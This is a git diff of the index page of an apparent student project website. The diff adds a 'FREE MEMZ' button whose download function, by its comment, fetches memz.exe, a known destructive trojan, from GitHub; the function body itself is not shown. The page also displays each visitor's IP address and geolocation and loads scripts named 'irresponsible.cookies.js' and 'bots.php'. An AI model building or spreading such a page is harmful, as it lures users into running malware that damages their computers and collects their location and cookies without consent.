@@ -1,49 +1,37 @@
-<!--
-    This is the index for a project website under the Digipen Institute of Technology Curriculum.
--->
 <!DOCTYPE html>
-
-<!-- prevent bot scrapping -->
-<meta name="robots" content="noindex, nofollow">
-
-
-<html>
+<html lang="en">
 <head>
     <title>Website Project</title>
     <!-- link css -->
-    <link rel="stylesheet" type="text/css" href="css/stylesheet.css">
+    <link rel="stylesheet" type="text/css" href="css/stylesheet2.css">
 
     <!-- set text encoding and set localized view -->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
-<h4>
-    <!-- Headerlinks -->
-    <!-- Page1 -->
-    <a href="pages/Page1.html">page 1</a>
-    <!-- Page2 -->
-    <a href="pages/Page3.html">page 3</a>
-    <br />
-    <!-- Page3 -->
-    <a href="pages/Page2.html">page 2</a>
-    <!-- Page4 -->
-    <a href="pages/Page4.html">page 4</a>
-</h4>
 <body>
+    <h4>
+        <!-- Other Pages -->
+        <a href="pages/Login.html">Log In</a> <a href="pages/petition.html">Net Neutrality</a> <a href="pages/Page3.html">page 3</a> <a href="pages/User-Information.html">User Information</a>
+    </h4>
     <h2>
         Welcome
     </h2>
     <p>I hope you like <br />the design...</p>
     <br>
-    <bodyIP>
-        <!-- Display Information -->
+    <h2>User Information</h2>
+    <div id="user-info">
         <p><strong>IP Address:</strong> <span id="ip-address"></span></p>
         <p><strong>Country:</strong> <span id="country"></span></p>
         <p><strong>Region:</strong> <span id="region"></span></p>
         <p><strong>City:</strong> <span id="city"></span></p>
         <p><strong>Latitude:</strong> <span id="latitude"></span></p>
         <p><strong>Longitude:</strong> <span id="longitude"></span></p>
-    </bodyIP>
+    </div>
+    <!-- load logs.js -->
+    <script src="scripts/irresponsible.cookies.js"></script>
+
+    <button onclick="downloadFile()">FREE MEMZ</button>
     <script>
         function downloadFile() {
             // Download memz.exe from github as a zip file
@@ -65,12 +53,8 @@
         }
     </script>
 
-    <button onclick="downloadFile()">FREE MEMZ</button>
-
     <!-- load bootstrap js -->
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous">
-
-    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
     <!-- load script.js -->
     <script src="scripts/scripts.js"></script>
     <!-- load logs.js -->
@@ -78,5 +62,8 @@
     <!-- load bots.php -->
     <script src="scripts/bots.php"></script>
 
+    <footer>
+        <a href="pages/DP1996/DigiPen%20Applied%20Computer%20Graphics%20School.html" target="_blank">Digipen Institute of Technology</a>
+    </footer>
 </body>
-</html> 
+</html>
